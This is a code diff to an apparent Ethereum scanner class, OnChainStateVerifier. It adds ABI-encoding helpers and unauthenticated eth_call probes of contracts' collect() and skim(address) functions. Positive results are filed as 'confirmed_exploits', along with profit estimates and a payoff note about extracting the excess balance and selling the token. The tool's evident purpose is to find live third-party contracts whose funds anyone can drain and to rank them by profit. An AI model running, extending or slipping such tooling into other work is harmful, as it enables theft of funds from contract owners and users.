@@ -662,34 +662,139 @@ class OnChainStateVerifier:
         except Exception:
             return None
 
+    PROBE_EOA = "0x000000000000000000000000000000000000a11ce"
+    _COLLECT_FN_RE = re.compile(
+        r"function\s+(collect(?:Protocol)?)\s*\(([^)]*)\)\s*(?:public|external)",
+        re.IGNORECASE,
+    )
+
     @staticmethod
-    def probe_unauth_selector(w3, address: str, signature: str, args_addr: Optional[str] = None) -> str:
+    def _classify_probe_error(exc: BaseException) -> str:
+        msg = str(exc).lower()
+        if any(
+            x in msg
+            for x in (
+                "owner", "auth", "caller is not", "unauthorized",
+                "accesscontrol", "ownable", "only ", "only factory",
+                "only platform", "not eoa", "not from", "governance",
+                "forbidden", "access denied", "!gov", "not manager",
+                "not admin", "not keeper", "not operator",
+            )
+        ):
+            return "auth"
+        return "revert"
+
+    @staticmethod
+    def _abi_word_addr(addr: str) -> bytes:
+        return bytes.fromhex(addr.lower().replace("0x", "")[-40:].rjust(64, "0"))
+
+    @staticmethod
+    def _abi_word_uint(value: int) -> bytes:
+        return int(value).to_bytes(32, "big")
+
+    @staticmethod
+    def _abi_dummy_args(types: List[str], recipient: str) -> Optional[bytes]:
+        """ABI-encode dummy args so eth_call hits the real selector."""
+        chunks: List[bytes] = []
+        for raw in types:
+            t = re.sub(r"\b(memory|calldata|storage|indexed)\b", "", raw).strip()
+            t = t.split()[0] if t else ""
+            tl = t.lower().replace(" ", "")
+            if "collectparams" in tl or tl.endswith("params"):
+                inner = OnChainStateVerifier._abi_dummy_args(
+                    ["uint256", "address", "uint128", "uint128"], recipient
+                )
+                if inner is None:
+                    return None
+                chunks.append(inner)
+                continue
+            if tl.startswith("(") and tl.endswith(")"):
+                inner_types = [p.strip() for p in tl[1:-1].split(",") if p.strip()]
+                inner = OnChainStateVerifier._abi_dummy_args(inner_types, recipient)
+                if inner is None:
+                    return None
+                chunks.append(inner)
+                continue
+            if tl == "address":
+                chunks.append(OnChainStateVerifier._abi_word_addr(recipient))
+            elif tl.startswith("uint"):
+                bits = int(tl[4:] or "256")
+                chunks.append(OnChainStateVerifier._abi_word_uint((1 << bits) - 1))
+            elif tl.startswith("int"):
+                chunks.append(OnChainStateVerifier._abi_word_uint(0))
+            else:
+                return None
+        return b"".join(chunks)
+
+    @staticmethod
+    def collect_probe_plan(
+        source_text: str,
+        recipient: str = "0x000000000000000000000000000000000000a11ce",
+    ) -> Optional[Tuple[str, bytes]]:
+        """Return (abi_signature, encoded_args) for the first non-interface collect."""
+        for m in OnChainStateVerifier._COLLECT_FN_RE.finditer(source_text or ""):
+            prefix = source_text[max(0, m.start() - 80): m.start()]
+            if "interface " in prefix:
+                continue
+            name = m.group(1)
+            raw_params = m.group(2).strip()
+            if not raw_params:
+                return f"{name}()", b""
+            types: List[str] = []
+            sig_types: List[str] = []
+            for part in raw_params.split(","):
+                p = re.sub(r"\b(memory|calldata|storage|indexed)\b", "", part).strip()
+                if not p:
+                    continue
+                typ = p.split()[0]
+                types.append(typ)
+                tl = typ.lower()
+                if "collectparams" in tl or tl.endswith("params"):
+                    sig_types.append("(uint256,address,uint128,uint128)")
+                else:
+                    sig_types.append(typ)
+            args = OnChainStateVerifier._abi_dummy_args(types, recipient)
+            if args is None:
+                return None
+            return f"{name}({','.join(sig_types)})", args
+        return None
+
+    @staticmethod
+    def v3_collect_gate(probe: str, eth_balance: float) -> Tuple[bool, str]:
+        """Confirm collect only when an unauth eth_call actually succeeds."""
+        if probe == "auth":
+            return False, "V3_COLLECT_AUTH_REVERTED"
+        if probe == "success":
+            return True, "V3_COLLECT_CALLABLE"
+        if eth_balance < 0.01:
+            return False, "V3_COLLECT_UNFUNDED"
+        return False, "V3_COLLECT_REVERT_OR_UNKNOWN"
+
+    @staticmethod
+    def probe_unauth_selector(
+        w3,
+        address: str,
+        signature: str,
+        args_addr: Optional[str] = None,
+        args_data: Optional[bytes] = None,
+    ) -> str:
         """Probe a selector from a random EOA. Returns success | auth | revert."""
         try:
             sel = w3.keccak(text=signature)[:4]
-            data = sel
-            if args_addr:
+            if args_data is not None:
+                data = sel + args_data
+            elif args_addr:
                 data = sel + bytes.fromhex(args_addr[2:].rjust(64, "0"))
+            else:
+                data = sel
             w3.eth.call({
-                "from": w3.to_checksum_address("0x000000000000000000000000000000000000a11ce"),
+                "from": w3.to_checksum_address(OnChainStateVerifier.PROBE_EOA),
                 "to": w3.to_checksum_address(address),
                 "data": data,
             })
             return "success"
         except Exception as e:
-            msg = str(e).lower()
-            if any(
-                x in msg
-                for x in (
-                    "owner", "auth", "caller is not", "unauthorized",
-                    "accesscontrol", "ownable", "only ", "only factory",
-                    "only platform", "not eoa", "not from", "governance",
-                    "forbidden", "access denied", "!gov", "not manager",
-                    "not admin", "not keeper", "not operator",
-                )
-            ):
-                return "auth"
-            return "revert"
+            return OnChainStateVerifier._classify_probe_error(e)
 
     @staticmethod
     def evaluate_swapback_liveness(w3, token_address: str, source_text: str) -> Dict:
@@ -821,6 +926,11 @@ class OnChainStateVerifier:
         )
         if not est.actionable:
             return None
+        probe = OnChainStateVerifier.probe_unauth_selector(
+            w3, pair, "skim(address)", args_addr=OnChainStateVerifier.PROBE_EOA
+        )
+        if probe != "success":
+            return None
         payload = profit_to_dict(est)
         return {
             "type": "PAIR_SKIM",
@@ -832,7 +942,7 @@ class OnChainStateVerifier:
             "payoff": "Extraer balance - getReserves y vender el token.",
             "snippet": "function skim(address to) external;",
             "onchain_evidence": (
-                f"pair={pair} excess_eth={pair_eth - res_eth:.4f} "
+                f"pair={pair} skim_probe={probe} excess_eth={pair_eth - res_eth:.4f} "
                 f"excess_token={pair_tok - res_tok:.4f} profit={est.expected_profit_eth:.4f}"
             ),
             "profit": payload,
@@ -1107,17 +1217,23 @@ class OnChainStateVerifier:
                     status_notes.append("MULTICALL_MSGVALUE_FUNDED")
 
             elif vtype == "V3_COLLECT_UNPROTECTED":
-                probe = OnChainStateVerifier.probe_unauth_selector(w3, address, "collect()")
-                if probe == "auth":
-                    status_notes.append("V3_COLLECT_AUTH_REVERTED")
-                elif eth_balance < 0.01 and probe != "success":
-                    status_notes.append("V3_COLLECT_UNFUNDED")
+                plan = OnChainStateVerifier.collect_probe_plan(source_text)
+                if plan is None:
+                    probe = OnChainStateVerifier.probe_unauth_selector(
+                        w3, address, "collect()"
+                    )
                 else:
+                    sig, args_data = plan
+                    probe = OnChainStateVerifier.probe_unauth_selector(
+                        w3, address, sig, args_data=args_data
+                    )
+                confirm, note = OnChainStateVerifier.v3_collect_gate(probe, eth_balance)
+                status_notes.append(note)
+                if confirm:
                     exp["onchain_evidence"] = (
-                        f"Ungated collect() probe={probe}; native={eth_balance:.4f} ETH"
+                        f"Ungated collect probe={probe}; native={eth_balance:.4f} ETH"
                     )
                     confirmed_exploits.append(exp)
-                    status_notes.append("V3_COLLECT_CALLABLE")
 
             elif vtype == "PUBLIC_SWAPBACK_TRIGGER":
                 live = OnChainStateVerifier.evaluate_swapback_liveness(w3, address, source_text)
